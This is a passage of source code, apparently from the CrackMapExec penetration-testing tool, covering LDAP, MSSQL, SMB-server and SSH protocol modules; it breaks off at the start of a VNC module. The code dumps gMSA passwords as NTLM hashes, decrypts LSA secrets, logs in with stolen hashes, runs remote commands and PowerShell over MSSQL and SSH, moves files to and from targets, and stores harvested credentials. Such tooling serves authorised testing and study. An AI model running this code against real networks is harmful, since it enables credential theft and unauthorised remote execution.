e.getAnswers()\n                pass\n            else:\n                return False\n        answers = []\n        self.logger.debug(f""Total of records returned {len(resp):d}"")\n\n        for item in resp:\n            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                continue\n            mustCommit = False\n            sAMAccountName = """"\n            memberOf = """"\n            pwdLastSet = """"\n            userAccountControl = 0\n            status = ""enabled""\n            lastLogon = ""N/A""\n            try:\n                for attribute in item[""attributes""]:\n                    if str(attribute[""type""]) == ""sAMAccountName"":\n                        sAMAccountName = str(attribute[""vals""][0])\n                        mustCommit = True\n                    elif str(attribute[""type""]) == ""userAccountControl"":\n                        if int(attribute[""vals""][0]) & 2:\n                            status = ""disabled""\n                        userAccountControl = f""0x{int(attribute[\'vals\'][0]):x}""\n                    elif str(attribute[""type""]) == ""memberOf"":\n                        memberOf = str(attribute[""vals""][0])\n                    elif str(attribute[""type""]) == ""pwdLastSet"":\n                        if str(attribute[""vals""][0]) == ""0"":\n                            pwdLastSet = ""<never>""\n                        else:\n                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute[""vals""][0])))))\n                    elif str(attribute[""type""]) == ""lastLogon"":\n                        if str(attribute[""vals""][0]) == ""0"":\n                            lastLogon = ""<never>""\n                        else:\n                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute[""vals""][0])))))\n                if mustCommit is True:\n                    answers.append(\n                        [\n                            sAMAccountName,\n                            memberOf,\n                            pwdLastSet,\n                            lastLogon,\n                            userAccountControl,\n                            status,\n                        ]\n                    )\n            except Exception as e:\n                self.logger.debug(""Exception:"", exc_info=True)\n                self.logger.debug(f""Skipping item, cannot process due to error {str(e)}"")\n                pass\n        if len(answers) > 0:\n            self.logger.debug(answers)\n            for value in answers:\n                self.logger.highlight(f""User: {value[0]} Status: {value[5]}"")\n        else:\n            self.logger.fail(""No entries found!"")\n        return\n\n    def admin_count(self):\n        # Building the search filter\n        searchFilter = ""(adminCount=1)""\n        attributes = [\n            ""sAMAccountName"",\n            ""pwdLastSet"",\n            ""MemberOf"",\n            ""userAccountControl"",\n            ""lastLogon"",\n        ]\n        resp = self.search(searchFilter, attributes, 0)\n        answers = []\n        self.logger.debug(f""Total of records returned {len(resp):d}"")\n\n        for item in resp:\n            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                continue\n            mustCommit = False\n            sAMAccountName = """"\n            memberOf = """"\n            pwdLastSet = """"\n            userAccountControl = 0\n            lastLogon = ""N/A""\n            try:\n                for attribute in item[""attributes""]:\n                    if str(attribute[""type""]) == ""sAMAccountName"":\n                        sAMAccountName = str(attribute[""vals""][0])\n                        mustCommit = True\n                    elif str(attribute[""type""]) == ""userAccountControl"":\n                        userAccountControl = ""0x%x"" % int(attribute[""vals""][0])\n                    elif str(attribute[""type""]) == ""memberOf"":\n                        memberOf = str(attribute[""vals""][0])\n                    elif str(attribute[""type""]) == ""pwdLastSet"":\n                        if str(attribute[""vals""][0]) == ""0"":\n                            pwdLastSet = ""<never>""\n                        else:\n                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute[""vals""][0])))))\n                    elif str(attribute[""type""]) == ""lastLogon"":\n                        if str(attribute[""vals""][0]) == ""0"":\n                            lastLogon = ""<never>""\n                        else:\n                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute[""vals""][0])))))\n                if mustCommit is True:\n                    answers.append(\n                        [\n                            sAMAccountName,\n                            memberOf,\n                            pwdLastSet,\n                            lastLogon,\n                            userAccountControl,\n                        ]\n                    )\n            except Exception as e:\n                self.logger.debug(""Exception:"", exc_info=True)\n                self.logger.debug(f""Skipping item, cannot process due to error {str(e)}"")\n                pass\n        if len(answers) > 0:\n            self.logger.debug(answers)\n            for value in answers:\n                self.logger.highlight(value[0])\n        else:\n            self.logger.fail(""No entries found!"")\n        return\n\n    def gmsa(self):\n        self.logger.display(""Getting GMSA Passwords"")\n        search_filter = ""(objectClass=msDS-GroupManagedServiceAccount)""\n        gmsa_accounts = self.ldapConnection.search(\n            searchFilter=search_filter,\n            attributes=[\n                ""sAMAccountName"",\n                ""msDS-ManagedPassword"",\n                ""msDS-GroupMSAMembership"",\n            ],\n            sizeLimit=0,\n            searchBase=self.baseDN,\n        )\n        if gmsa_accounts:\n            answers = []\n            self.logger.debug(f""Total of records returned {len(gmsa_accounts):d}"")\n\n            for item in gmsa_accounts:\n                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                    continue\n                sAMAccountName = """"\n                passwd = """"\n                for attribute in item[""attributes""]:\n                    if str(attribute[""type""]) == ""sAMAccountName"":\n                        sAMAccountName = str(attribute[""vals""][0])\n                    if str(attribute[""type""]) == ""msDS-ManagedPassword"":\n                        data = attribute[""vals""][0].asOctets()\n                        blob = MSDS_MANAGEDPASSWORD_BLOB()\n                        blob.fromString(data)\n                        currentPassword = blob[""CurrentPassword""][:-2]\n                        ntlm_hash = MD4.new()\n                        ntlm_hash.update(currentPassword)\n                        passwd = hexlify(ntlm_hash.digest()).decode(""utf-8"")\n                self.logger.highlight(f""Account: {sAMAccountName:<20} NTLM: {passwd}"")\n        return True\n\n    def decipher_gmsa_name(self, domain_name=None, account_name=None):\n        # https://aadinternals.com/post/gmsa/\n        gmsa_account_name = (domain_name + account_name).upper()\n        self.logger.debug(f""GMSA name for {gmsa_account_name}"")\n        bin_account_name = gmsa_account_name.encode(""utf-16le"")\n        bin_hash = hmac.new(bytes("""", ""latin-1""), msg=bin_account_name, digestmod=hashlib.sha256).digest()\n        hex_letters = ""0123456789abcdef""\n        str_hash = """"\n        for b in bin_hash:\n            str_hash += hex_letters[b & 0x0F]\n            str_hash += hex_letters[b >> 0x04]\n        self.logger.debug(f""Hash2: {str_hash}"")\n        return str_hash\n\n    def gmsa_convert_id(self):\n        if self.args.gmsa_convert_id:\n            if len(self.args.gmsa_convert_id) != 64:\n                self.logger.fail(""Length of the gmsa id not correct :\'("")\n            else:\n                # getting the gmsa account\n                search_filter = ""(objectClass=msDS-GroupManagedServiceAccount)""\n                gmsa_accounts = self.ldapConnection.search(\n                    searchFilter=search_filter,\n                    attributes=[""sAMAccountName""],\n                    sizeLimit=0,\n                    searchBase=self.baseDN,\n                )\n                if gmsa_accounts:\n                    answers = []\n                    self.logger.debug(f""Total of records returned {len(gmsa_accounts):d}"")\n\n                    for item in gmsa_accounts:\n                        if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                            continue\n                        sAMAccountName = """"\n                        for attribute in item[""attributes""]:\n                            if str(attribute[""type""]) == ""sAMAccountName"":\n                                sAMAccountName = str(attribute[""vals""][0])\n                                if self.decipher_gmsa_name(self.domain.split(""."")[0], sAMAccountName[:-1]) == self.args.gmsa_convert_id:\n                                    self.logger.highlight(f""Account: {sAMAccountName:<20} ID: {self.args.gmsa_convert_id}"")\n                                    break\n        else:\n            self.logger.fail(""No string provided :\'("")\n\n    def gmsa_decrypt_lsa(self):\n        if self.args.gmsa_decrypt_lsa:\n            if ""_SC_GMSA_{84A78B8C"" in self.args.gmsa_decrypt_lsa:\n                gmsa = self.args.gmsa_decrypt_lsa.split(""_"")[4].split("":"")\n                gmsa_id = gmsa[0]\n                gmsa_pass = gmsa[1]\n                # getting the gmsa account\n                search_filter = ""(objectClass=msDS-GroupManagedServiceAccount)""\n                gmsa_accounts = self.ldapConnection.search(\n                    searchFilter=search_filter,\n                    attributes=[""sAMAccountName""],\n                    sizeLimit=0,\n                    searchBase=self.baseDN,\n                )\n                if gmsa_accounts:\n                    answers = []\n                    self.logger.debug(f""Total of records returned {len(gmsa_accounts):d}"")\n\n                    for item in gmsa_accounts:\n                        if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                            continue\n                        sAMAccountName = """"\n                        for attribute in item[""attributes""]:\n                            if str(attribute[""type""]) == ""sAMAccountName"":\n                                sAMAccountName = str(attribute[""vals""][0])\n                                if self.decipher_gmsa_name(self.domain.split(""."")[0], sAMAccountName[:-1]) == gmsa_id:\n                                    gmsa_id = sAMAccountName\n                                    break\n                # convert to ntlm\n                data = bytes.fromhex(gmsa_pass)\n                blob = MSDS_MANAGEDPASSWORD_BLOB()\n                blob.fromString(data)\n                currentPassword = blob[""CurrentPassword""][:-2]\n                ntlm_hash = MD4.new()\n                ntlm_hash.update(currentPassword)\n                passwd = hexlify(ntlm_hash.digest()).decode(""utf-8"")\n                self.logger.highlight(f""Account: {gmsa_id:<20} NTLM: {passwd}"")\n        else:\n            self.logger.fail(""No string provided :\'("")\n\n    def bloodhound(self):\n        auth = ADAuthentication(\n            username=self.username,\n            password=self.password,\n            domain=self.domain,\n            lm_hash=self.nthash,\n            nt_hash=self.nthash,\n            aeskey=self.aesKey,\n            kdc=self.kdcHost,\n            auth_method=""auto"",\n        )\n        ad = AD(\n            auth=auth,\n            domain=self.domain,\n            nameserver=self.args.nameserver,\n            dns_tcp=False,\n            dns_timeout=3,\n        )\n        collect = resolve_collection_methods(""Default"" if not self.args.collection else self.args.collection)\n        if not collect:\n            return\n        self.logger.highlight(""Resolved collection methods: "" + "", "".join(list(collect)))\n\n        self.logger.debug(""Using DNS to retrieve domain information"")\n        ad.dns_resolve(domain=self.domain)\n\n        if self.args.kerberos:\n            self.logger.highlight(""Using kerberos auth without ccache, getting TGT"")\n            auth.get_tgt()\n        if self.args.use_kcache:\n            self.logger.highlight(""Using kerberos auth from ccache"")\n\n        timestamp = datetime.now().strftime(""%Y-%m-%d_%H%M%S"") + ""_""\n        bloodhound = BloodHound(ad, self.hostname, self.host, self.args.port)\n        bloodhound.connect()\n\n        bloodhound.run(\n            collect=collect,\n            num_workers=10,\n            disable_pooling=False,\n            timestamp=timestamp,\n            computerfile=None,\n            cachefile=None,\n            exclude_dcs=False,\n        )\n\n        self.logger.highlight(f""Compressing output into {self.output_filename}bloodhound.zip"")\n        list_of_files = os.listdir(os.getcwd())\n        with ZipFile(self.output_filename + ""bloodhound.zip"", ""w"") as z:\n            for each_file in list_of_files:\n                if each_file.startswith(timestamp) and each_file.endswith(""json""):\n                    z.write(each_file)\n                    os.remove(each_file)\n', 'mssql.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nimport logging\nimport os\nfrom io import StringIO\n\nfrom cme.config import process_secret\nfrom cme.protocols.mssql.mssqlexec import MSSQLEXEC\nfrom cme.connection import *\nfrom cme.helpers.logger import highlight\nfrom cme.helpers.bloodhound import add_user_bh\nfrom cme.helpers.powershell import create_ps_command\nfrom impacket import tds\nfrom impacket.krb5.ccache import CCache\nfrom impacket.smbconnection import SMBConnection, SessionError\nfrom impacket.tds import (\n    SQLErrorException,\n    TDS_LOGINACK_TOKEN,\n    TDS_ERROR_TOKEN,\n    TDS_ENVCHANGE_TOKEN,\n    TDS_INFO_TOKEN,\n    TDS_ENVCHANGE_VARCHAR,\n    TDS_ENVCHANGE_DATABASE,\n    TDS_ENVCHANGE_LANGUAGE,\n    TDS_ENVCHANGE_CHARSET,\n    TDS_ENVCHANGE_PACKETSIZE,\n)\n\n\nclass mssql(connection):\n    def __init__(self, args, db, host):\n        self.mssql_instances = None\n        self.domain = None\n        self.server_os = None\n        self.hash = None\n        self.os_arch = None\n        self.nthash = """"\n\n        connection.__init__(self, args, db, host)\n\n    def proto_flow(self):\n        self.proto_logger()\n        if self.create_conn_obj():\n            self.enum_host_info()\n            self.print_host_info()\n            if self.login():\n                if hasattr(self.args, ""module"") and self.args.module:\n                    self.call_modules()\n                else:\n                    self.call_cmd_args()\n\n    def proto_logger(self):\n        self.logger = CMEAdapter(\n            extra={\n                ""protocol"": ""MSSQL"",\n                ""host"": self.host,\n                ""port"": self.args.port,\n                ""hostname"": ""None"",\n            }\n        )\n\n    def enum_host_info(self):\n        # this try pass breaks module http server, more info https://github.com/byt3bl33d3r/CrackMapExec/issues/363\n        try:\n            # Probably a better way of doing this, grab our IP from the socket\n            self.local_ip = str(self.conn.socket).split()[2].split(""="")[1].split("":"")[0]\n        except:\n            pass\n\n        if self.args.no_smb:\n            self.domain = self.args.domain\n        else:\n            try:\n                smb_conn = SMBConnection(self.host, self.host, None)\n                try:\n                    smb_conn.login("""", """")\n                except SessionError as e:\n                    if ""STATUS_ACCESS_DENIED"" in e.getErrorString():\n                        pass\n\n                self.domain = smb_conn.getServerDNSDomainName()\n                self.hostname = smb_conn.getServerName()\n                self.server_os = smb_conn.getServerOS()\n                self.logger.extra[""hostname""] = self.hostname\n\n                try:\n                    smb_conn.logoff()\n                except:\n                    pass\n\n                if self.args.domain:\n                    self.domain = self.args.domain\n\n                if self.args.local_auth:\n                    self.domain = self.hostname\n            except Exception as e:\n                self.logger.fail(f""Error retrieving host domain: {e} specify one manually with the \'-d\' flag"")\n\n        self.mssql_instances = self.conn.getInstances(0)\n        self.db.add_host(\n            self.host,\n            self.hostname,\n            self.domain,\n            self.server_os,\n            len(self.mssql_instances),\n        )\n\n        try:\n            self.conn.disconnect()\n        except:\n            pass\n\n    def print_host_info(self):\n        self.logger.display(f""{self.server_os} (name:{self.hostname}) (domain:{self.domain})"")\n        # if len(self.mssql_instances) > 0:\n        #     self.logger.display(""MSSQL DB Instances: {}"".format(len(self.mssql_instances)))\n        #     for i, instance in enumerate(self.mssql_instances):\n        #         self.logger.debug(""Instance {}"".format(i))\n        #         for key in instance.keys():\n        #             self.logger.debug(key + "":"" + instance[key])\n\n    def create_conn_obj(self):\n        try:\n            self.conn = tds.MSSQL(self.host, self.args.port)\n            self.conn.connect()\n        except socket.error as e:\n            self.logger.debug(f""Error connecting to MSSQL: {e}"")\n            return False\n        return True\n\n    def check_if_admin(self):\n        try:\n            results = self.conn.sql_query(""SELECT IS_SRVROLEMEMBER(\'sysadmin\')"")\n            is_admin = int(results[0][""""])\n        except Exception as e:\n            self.logger.fail(f""Error querying for sysadmin role: {e}"")\n            return False\n\n        if is_admin:\n            self.admin_privs = True\n            self.logger.debug(f""User is admin"")\n        else:\n            return False\n        return True\n\n    def kerberos_login(\n        self,\n        domain,\n        username,\n        password="""",\n        ntlm_hash="""",\n        aesKey="""",\n        kdcHost="""",\n        useCache=False,\n    ):\n        try:\n            self.conn.disconnect()\n        except:\n            pass\n        self.create_conn_obj()\n\n        nthash = """"\n        hashes = None\n        if ntlm_hash != """":\n            if ntlm_hash.find("":"") != -1:\n                hashes = ntlm_hash\n                nthash = ntlm_hash.split("":"")[1]\n            else:\n                # only nt hash\n                hashes = f"":{ntlm_hash}""\n                nthash = ntlm_hash\n\n        if not all("""" == s for s in [self.nthash, password, aesKey]):\n            kerb_pass = next(s for s in [self.nthash, password, aesKey] if s)\n        else:\n            kerb_pass = """"\n        try:\n            res = self.conn.kerberosLogin(\n                None,\n                username,\n                password,\n                domain,\n                hashes,\n                aesKey,\n                kdcHost=kdcHost,\n                useCache=useCache,\n            )\n            if res is not True:\n                self.conn.printReplies()\n                return False\n\n            self.password = password\n            if username == """" and useCache:\n                ccache = CCache.loadFile(os.getenv(""KRB5CCNAME""))\n                principal = ccache.principal.toPrincipal()\n                self.username = principal.components[0]\n                username = principal.components[0]\n            else:\n                self.username = username\n            self.domain = domain\n            self.check_if_admin()\n\n            used_ccache = "" from ccache"" if useCache else f"":{process_secret(kerb_pass)}""\n            domain = f""{domain}\\\\"" if not self.args.local_auth else """"\n\n            self.logger.success(f""{domain}{username}{used_ccache} {self.mark_pwned()}"")\n            if not self.args.local_auth:\n                add_user_bh(self.username, self.domain, self.logger, self.config)\n            return True\n        except Exception as e:\n            used_ccache = "" from ccache"" if useCache else f"":{process_secret(kerb_pass)}""\n            domain = f""{domain}\\\\"" if not self.args.local_auth else """"\n            self.logger.fail(f""{domain}\\\\{username}{used_ccache} {e}"")\n            return False\n\n    def plaintext_login(self, domain, username, password):\n        try:\n            self.conn.disconnect()\n        except:\n            pass\n        self.create_conn_obj()\n\n        try:\n            # this is to prevent a decoding issue in impacket/ntlm.py:617 where it attempts to decode the domain\n            if not domain:\n                domain = """"\n            res = self.conn.login(None, username, password, domain, None, not self.args.local_auth)\n            if res is not True:\n                self.handle_mssql_reply()\n                return False\n\n            self.password = password\n            self.username = username\n            self.domain = domain\n            self.check_if_admin()\n            self.db.add_credential(""plaintext"", domain, username, password)\n\n            if self.admin_privs:\n                self.db.add_admin_user(""plaintext"", domain, username, password, self.host)\n\n            domain = f""{domain}\\\\"" if not self.args.local_auth else """"\n            out = f""{domain}{username}:{process_secret(password)} {self.mark_pwned()}""\n            self.logger.success(out)\n            if not self.args.local_auth:\n                add_user_bh(self.username, self.domain, self.logger, self.config)\n            return True\n        except BrokenPipeError as e:\n            self.logger.fail(f""Broken Pipe Error while attempting to login"")\n            return False\n        except Exception as e:\n            self.logger.fail(f""{domain}\\\\{username}:{process_secret(password)}"")\n            self.logger.exception(e)\n            return False\n\n    def hash_login(self, domain, username, ntlm_hash):\n        lmhash = """"\n        nthash = """"\n\n        # This checks to see if we didn\'t provide the LM Hash\n        if ntlm_hash.find("":"") != -1:\n            lmhash, nthash = ntlm_hash.split("":"")\n        else:\n            nthash = ntlm_hash\n\n        try:\n            self.conn.disconnect()\n        except:\n            pass\n        self.create_conn_obj()\n\n        try:\n            res = self.conn.login(\n                None,\n                username,\n                """",\n                domain,\n                "":"" + nthash if not lmhash else ntlm_hash,\n                not self.args.local_auth,\n            )\n            if res is not True:\n                self.conn.printReplies()\n                return False\n\n            self.hash = ntlm_hash\n            self.username = username\n            self.domain = domain\n            self.check_if_admin()\n            self.db.add_credential(""hash"", domain, username, ntlm_hash)\n\n            if self.admin_privs:\n                self.db.add_admin_user(""hash"", domain, username, ntlm_hash, self.host)\n\n            out = f""{domain}\\\\{username} {process_secret(ntlm_hash)} {self.mark_pwned()}""\n            self.logger.success(out)\n            if not self.args.local_auth:\n                add_user_bh(self.username, self.domain, self.logger, self.config)\n            return True\n        except BrokenPipeError as e:\n            self.logger.fail(f""Broken Pipe Error while attempting to login"")\n            return False\n        except Exception as e:\n            self.logger.fail(f""{domain}\\\\{username}:{process_secret(ntlm_hash)} {e}"")\n            return False\n\n    def mssql_query(self):\n        if self.conn.lastError:\n            # Invalid connection\n            return None\n        query = self.args.mssql_query\n        self.logger.info(f""Query to run:\\n{query}"")\n        try:\n            raw_output = self.conn.sql_query(query)\n            self.logger.info(""Executed MSSQL query"")\n            self.logger.debug(f""Raw output: {raw_output}"")\n            for data in raw_output:\n                if isinstance(data, dict):\n                    for key, value in data.items():\n                        if key:\n                            self.logger.highlight(f""{key}:{value}"")\n                        else:\n                            self.logger.highlight(f""{value}"")\n                else:\n                    self.logger.fail(""Unexpected output"")\n        except Exception as e:\n            self.logger.exception(e)\n            return None\n\n        return raw_output\n\n    @requires_admin\n    def execute(self, payload=None, print_output=False):\n        if not payload and self.args.execute:\n            payload = self.args.execute\n\n        self.logger.info(f""Command to execute:\\n{payload}"")\n        try:\n            exec_method = MSSQLEXEC(self.conn)\n            raw_output = exec_method.execute(payload, print_output)\n            self.logger.info(""Executed command via mssqlexec"")\n            self.logger.debug(f""Raw output: {raw_output}"")\n        except Exception as e:\n            self.logger.exception(e)\n            return None\n\n        if hasattr(self, ""server""):\n            self.server.track_host(self.host)\n\n        if self.args.execute or self.args.ps_execute:\n            self.logger.success(""Executed command via mssqlexec"")\n            if self.args.no_output:\n                self.logger.debug(f""Output set to disabled"")\n            else:\n                for line in raw_output:\n                    self.logger.highlight(line)\n\n        return raw_output\n\n    @requires_admin\n    def ps_execute(\n        self,\n        payload=None,\n        get_output=False,\n        methods=None,\n        force_ps32=False,\n        dont_obfs=True,\n    ):\n        if not payload and self.args.ps_execute:\n            payload = self.args.ps_execute\n            if not self.args.no_output:\n                get_output = True\n\n        # We\'re disabling PS obfuscation by default as it breaks the MSSQLEXEC execution method\n        ps_command = create_ps_command(payload, force_ps32=force_ps32, dont_obfs=dont_obfs)\n        return self.execute(ps_command, get_output)\n\n    @requires_admin\n    def put_file(self):\n        self.logger.display(f""Copy {self.args.put_file[0]} to {self.args.put_file[1]}"")\n        with open(self.args.put_file[0], ""rb"") as f:\n            try:\n                data = f.read()\n                self.logger.display(f""Size is {len(data)} bytes"")\n                exec_method = MSSQLEXEC(self.conn)\n                exec_method.put_file(data, self.args.put_file[1])\n                if exec_method.file_exists(self.args.put_file[1]):\n                    self.logger.success(""File has been uploaded on the remote machine"")\n                else:\n                    self.logger.fail(""File does not exist on the remote system... error during upload"")\n            except Exception as e:\n                self.logger.fail(f""Error during upload : {e}"")\n\n    @requires_admin\n    def get_file(self):\n        remote_path = self.args.get_file[0]\n        download_path = self.args.get_file[1]\n        self.logger.display(f\'Copying ""{remote_path}"" to ""{download_path}""\')\n        \n        try:\n            exec_method = MSSQLEXEC(self.conn)\n            exec_method.get_file(self.args.get_file[0], self.args.get_file[1])\n            self.logger.success(f\'File ""{remote_path}"" was downloaded to ""{download_path}""\')\n        except Exception as e:\n            self.logger.fail(f\'Error reading file ""{remote_path}"": {e}\')\n            if os.path.getsize(download_path) == 0:\n                os.remove(download_path)\n\n    # We hook these functions in the tds library to use CME\'s logger instead of printing the output to stdout\n    # The whole tds library in impacket needs a good overhaul to preserve my sanity\n    def handle_mssql_reply(self):\n        for keys in self.conn.replies.keys():\n            for i, key in enumerate(self.conn.replies[keys]):\n                if key[""TokenType""] == TDS_ERROR_TOKEN:\n                    error = f""ERROR({key[\'ServerName\'].decode(\'utf-16le\')}): Line {key[\'LineNumber\']:d}: {key[\'MsgText\'].decode(\'utf-16le\')}""\n                    self.conn.lastError = SQLErrorException(f""ERROR: Line {key[\'LineNumber\']:d}: {key[\'MsgText\'].decode(\'utf-16le\')}"")\n                    self.logger.fail(error)\n                elif key[""TokenType""] == TDS_INFO_TOKEN:\n                    self.logger.display(f""INFO({key[\'ServerName\'].decode(\'utf-16le\')}): Line {key[\'LineNumber\']:d}: {key[\'MsgText\'].decode(\'utf-16le\')}"")\n                elif key[""TokenType""] == TDS_LOGINACK_TOKEN:\n                    self.logger.display(f""ACK: Result: {key[\'Interface\']} - {key[\'ProgName\'].decode(\'utf-16le\')} ({key[\'MajorVer\']:d}{key[\'MinorVer\']:d} {key[\'BuildNumHi\']:d}{key[\'BuildNumLow\']:d}) "")\n                elif key[""TokenType""] == TDS_ENVCHANGE_TOKEN:\n                    if key[""Type""] in (\n                        TDS_ENVCHANGE_DATABASE,\n                        TDS_ENVCHANGE_LANGUAGE,\n                        TDS_ENVCHANGE_CHARSET,\n                        TDS_ENVCHANGE_PACKETSIZE,\n                    ):\n                        record = TDS_ENVCHANGE_VARCHAR(key[""Data""])\n                        if record[""OldValue""] == """":\n                            record[""OldValue""] = ""None"".encode(""utf-16le"")\n                        elif record[""NewValue""] == """":\n                            record[""NewValue""] = ""None"".encode(""utf-16le"")\n                        if key[""Type""] == TDS_ENVCHANGE_DATABASE:\n                            _type = ""DATABASE""\n                        elif key[""Type""] == TDS_ENVCHANGE_LANGUAGE:\n                            _type = ""LANGUAGE""\n                        elif key[""Type""] == TDS_ENVCHANGE_CHARSET:\n                            _type = ""CHARSET""\n                        elif key[""Type""] == TDS_ENVCHANGE_PACKETSIZE:\n                            _type = ""PACKETSIZE""\n                        else:\n                            _type = f""{key[\'Type\']:d}""\n                        self.logger.display(f""ENVCHANGE({_type}): Old Value: {record[\'OldValue\'].decode(\'utf-16le\')}, New Value: {record[\'NewValue\'].decode(\'utf-16le\')}"")\n', 'smb.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport threading\nfrom threading import enumerate\nfrom sys import exit\nfrom impacket import smbserver\n\n\nclass CMESMBServer(threading.Thread):\n    def __init__(\n        self,\n        logger,\n        share_name,\n        share_path=""/tmp/cme_hosted"",\n        listen_address=""0.0.0.0"",\n        listen_port=445,\n        verbose=False,\n    ):\n        try:\n            threading.Thread.__init__(self)\n            self.server = smbserver.SimpleSMBServer(listen_address, listen_port)\n            self.server.addShare(share_name.upper(), share_path)\n            if verbose:\n                self.server.setLogFile("""")\n            self.server.setSMB2Support(True)\n            self.server.setSMBChallenge("""")\n        except Exception as e:\n            errno, message = e.args\n            if errno == 98 and message == ""Address already in use"":\n                logger.error(""Error starting SMB server on port 445: the port is already in use"")\n            else:\n                logger.error(f""Error starting SMB server on port 445: {message}"")\n                exit(1)\n\n    def addShare(self, share_name, share_path):\n        self.server.addShare(share_name, share_path)\n\n    def run(self):\n        try:\n            self.server.start()\n        except:\n            pass\n\n    def shutdown(self):\n        # TODO: should fine the proper way\n        # make sure all the threads are killed\n        for thread in enumerate():\n            if thread.is_alive():\n                try:\n                    self._stop()\n                except:\n                    pass\n', 'ssh.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nimport logging\n\nfrom io import StringIO\n\nimport paramiko\n\nfrom cme.config import process_secret\nfrom cme.connection import *\nfrom cme.logger import CMEAdapter\nfrom paramiko.ssh_exception import (\n    AuthenticationException,\n    NoValidConnectionsError,\n    SSHException,\n)\n\n\nclass ssh(connection):\n    def __init__(self, args, db, host):\n        self.protocol = ""SSH""\n        self.remote_version = None\n        self.server_os = None\n        super().__init__(args, db, host)\n\n    def proto_logger(self):\n        self.logger = CMEAdapter(\n            extra={\n                ""protocol"": ""SSH"",\n                ""host"": self.host,\n                ""port"": self.args.port,\n                ""hostname"": self.hostname,\n            }\n        )\n        logging.getLogger(""paramiko"").setLevel(logging.WARNING)\n\n    def print_host_info(self):\n        self.logger.display(self.remote_version)\n        return True\n\n    def enum_host_info(self):\n        self.remote_version = self.conn._transport.remote_version\n        self.logger.debug(f""Remote version: {self.remote_version}"")\n        self.server_os = """"\n        if self.args.remote_enum:\n            stdin, stdout, stderr = self.conn.exec_command(""uname -r"")\n            self.server_os = stdout.read().decode(""utf-8"")\n            self.logger.debug(f""OS retrieved: {self.server_os}"")\n        self.db.add_host(self.host, self.args.port, self.remote_version, os=self.server_os)\n\n    def create_conn_obj(self):\n        self.conn = paramiko.SSHClient()\n        self.conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n\n        try:\n            self.conn.connect(self.host, port=self.args.port)\n        except AuthenticationException:\n            return True\n        except SSHException:\n            return True\n        except NoValidConnectionsError:\n            return False\n        except socket.error:\n            return False\n\n    def client_close(self):\n        self.conn.close()\n\n    def check_if_admin(self):\n        # we could add in another method to check by piping in the password to sudo\n        # but that might be too much of an opsec concern - maybe add in a flag to do more checks?\n        stdin, stdout, stderr = self.conn.exec_command(""id"")\n        if stdout.read().decode(""utf-8"").find(""uid=0(root)"") != -1:\n            self.logger.info(f""Determined user is root via `id` command"")\n            self.admin_privs = True\n            return True\n        stdin, stdout, stderr = self.conn.exec_command(""sudo -ln | grep \'NOPASSWD: ALL\'"")\n        if stdout.read().decode(""utf-8"").find(""NOPASSWD: ALL"") != -1:\n            self.logger.info(f""Determined user is root via `sudo -ln` command"")\n            self.admin_privs = True\n            return True\n\n    def plaintext_login(self, username, password, private_key=None):\n        try:\n            if self.args.key_file or private_key:\n                if private_key:\n                    pkey = paramiko.RSAKey.from_private_key(StringIO(private_key))\n                else:\n                    pkey = paramiko.RSAKey.from_private_key_file(self.args.key_file)\n\n                self.logger.debug(f""Logging in with key"")\n                self.conn.connect(\n                    self.host,\n                    port=self.args.port,\n                    username=username,\n                    passphrase=password if password != """" else None,\n                    pkey=pkey,\n                    look_for_keys=False,\n                    allow_agent=False,\n                )\n                if private_key:\n                    cred_id = self.db.add_credential(\n                        ""key"",\n                        username,\n                        password if password != """" else """",\n                        key=private_key,\n                    )\n                else:\n                    with open(self.args.key_file, ""r"") as f:\n                        key_data = f.read()\n                    cred_id = self.db.add_credential(\n                        ""key"",\n                        username,\n                        password if password != """" else """",\n                        key=key_data,\n                    )\n            else:\n                self.logger.debug(f""Logging in with password"")\n                self.conn.connect(\n                    self.host,\n                    port=self.args.port,\n                    username=username,\n                    password=password,\n                    look_for_keys=False,\n                    allow_agent=False,\n                )\n                cred_id = self.db.add_credential(""plaintext"", username, password)\n\n            shell_access = False\n            host_id = self.db.get_hosts(self.host)[0].id\n\n            if self.check_if_admin():\n                shell_access = True\n                self.logger.debug(f""User {username} logged in successfully and is root!"")\n                if self.args.key_file:\n                    self.db.add_admin_user(""key"", username, password, host_id=host_id, cred_id=cred_id)\n                else:\n                    self.db.add_admin_user(\n                        ""plaintext"",\n                        username,\n                        password,\n                        host_id=host_id,\n                        cred_id=cred_id,\n                    )\n            else:\n                stdin, stdout, stderr = self.conn.exec_command(""id"")\n                output = stdout.read().decode(""utf-8"")\n                if not output:\n                    self.logger.debug(f""User cannot get a shell"")\n                    shell_access = False\n                else:\n                    shell_access = True\n\n            self.db.add_loggedin_relation(cred_id, host_id, shell=shell_access)\n\n            if self.args.key_file:\n                password = f""{password} (keyfile: {self.args.key_file})""\n\n            display_shell_access = f"" - shell access!"" if shell_access else """"\n\n            self.logger.success(f""{username}:{process_secret(password)} {self.mark_pwned()}{highlight(display_shell_access)}"")\n            return True\n        except (\n            AuthenticationException,\n            NoValidConnectionsError,\n            ConnectionResetError,\n        ) as e:\n            self.logger.fail(f""{username}:{process_secret(password)} {e}"")\n            self.client_close()\n            return False\n        except Exception as e:\n            self.logger.exception(e)\n            self.client_close()\n            return False\n\n    def execute(self, payload=None, output=False):\n        try:\n            command = payload if payload is not None else self.args.execute\n            stdin, stdout, stderr = self.conn.exec_command(command)\n        except AttributeError:\n            return """"\n        if output:\n            self.logger.success(""Executed command"")\n            for line in stdout:\n                self.logger.highlight(line.strip())\n            return stdout\n', 'vnc.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport asyncio\nimport os\nfrom datetime import datetime\n\nfrom aardwolf.commons.target import RDPTarget\n\nfrom cme.connection import *\nfrom cme.helpers.logger import highlight\nfrom cme.logger import CMEAdapter\nfrom aardwolf.vncconnection import 